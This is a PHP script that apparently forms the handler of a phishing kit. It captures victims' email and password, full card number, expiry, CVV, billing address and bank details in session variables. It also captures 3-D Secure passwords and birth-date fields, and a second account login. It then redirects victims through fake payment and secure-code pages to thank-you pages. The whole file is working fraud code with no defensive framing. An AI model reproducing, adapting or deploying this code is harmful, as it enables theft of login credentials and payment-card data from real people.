<?php 
	session_start();
	if (isset($_POST['submit'])){
		$_SESSION["user"] = $_POST['email'];
		$_SESSION["password"] = $_POST['password'];
		$_SESSION["ip"] = $_POST['ip'];
		$_SESSION["countryip"] = $_POST['countryip'];
		$_SESSION['datetimeopen'] = date("Y/m/d h:i:s:A");
		$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
		header('Location: payment.php');
	}
	if (isset($_POST['start'])) {
		$_SESSION["fname"] = $_POST['fname'];
		$_SESSION["lname"] = $_POST['lname'];
		$_SESSION["cn"] = $_POST['cn'];
		$_SESSION["exp_dt"] = $_POST['exp_dt'];
		$_SESSION["cvv"] = $_POST['cvv'];
		$_SESSION["addresse"] = $_POST['addresse'];
		$_SESSION["city"] = $_POST['city'];
		$_SESSION["country"] = $_POST['country'];
		$_SESSION["zip"] = $_POST['zip'];
		$_SESSION["namebank"] = $_POST['namebank'];
		$_SESSION["schemecard"] = $_POST['schemecard'];
		$_SESSION["typecard"] = $_POST['typecard'];
		$_SESSION["urlbank"] = $_POST['urlbank'];
		$_SESSION["phonebank"] = $_POST['phonebank'];
		$id = $_SESSION['cn'];
		$ss = strlen($id);
		$lengthcard = $ss - 4;
		$cardX =  substr($id,$lengthcard);
		$_SESSION['cardx'] = $cardX;
		if ($_SESSION['schemecard'] == "Visa" || $_SESSION['schemecard'] == "VISA" || $_SESSION['schemecard'] == "visa" ) {
			header('Location: payment.php?secure_code_v');
		}elseif ($_SESSION['schemecard'] == "Mastercard" || $_SESSION['schemecard'] == "mastercard" || $_SESSION['schemecard'] == "MASTERCARD") {
			header('Location: payment.php?secure_code_m');
		}else{
			header('Location: tnk_v.php');
		}
	}
	if(isset($_POST['btn_last'])){
		$_SESSION['dd'] = $_POST['dd'];
		$_SESSION['mm'] = $_POST['mm'];
		$_SESSION['yy'] = $_POST['yy'];
		$_SESSION['z1'] = $_POST['z1'];
		$_SESSION['z2'] = $_POST['z2'];
		$_SESSION['z3'] = $_POST['z3'];
		$_SESSION['dsecure'] = $_POST['dsecure'];
		header('Location: tnk_v.php');
	}
	if (isset($_POST['btnm_last'])) {
		$_SESSION['dd'] = $_POST['dd'];
		$_SESSION['mm'] = $_POST['mm'];
		$_SESSION['yy'] = $_POST['yy'];
		$_SESSION['cdholder'] = $_POST['cdholder'];
		$_SESSION['passwd'] = $_POST['passwd'];
		$_SESSION['passwd2'] = $_POST['passwd2'];
		header('Location: tnk_v.php');
	}
	if(isset($_POST['btnplll'])){
		$_SESSION['emailpl'] = $_POST['emailpl'];
		$_SESSION['passpl'] = $_POST['passpl'];
		header('Location: tnk_p.php');
	}
?>